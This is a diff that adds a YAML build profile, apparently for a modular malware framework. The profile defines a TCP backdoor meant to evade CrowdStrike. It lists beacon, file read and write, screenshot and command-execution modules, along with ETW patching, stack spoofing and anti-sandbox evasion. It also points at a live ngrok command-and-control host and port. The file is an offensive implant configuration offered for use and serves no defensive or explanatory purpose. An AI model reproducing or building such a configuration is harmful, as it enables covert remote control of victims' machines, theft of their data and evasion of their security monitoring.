@@ -1,0 +1,34 @@
+name: backdoor_cs_ngrok
+description: TCP backdoor tuned for CrowdStrike evasion via ngrok tunnel
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/tcp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_filelist
+  - commands/cmd_fileread
+  - commands/cmd_filewrite
+  - commands/cmd_screenshot
+  - commands/cmd_netinfo
+  - commands/cmd_exec
+
+arch: arch/backdoor
+api_resolve: api_resolve/api_hash_ror13
+resources: true
+
+evasion:
+  - evasion/etw_patch
+  - evasion/stack_spoof
+  - evasion/anti_sandbox
+  - evasion/deferred_exec
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "0.tcp.jp.ngrok.io"
+  C2_PORT: "22301"
+  BEACON_INTERVAL_MS: "30000"
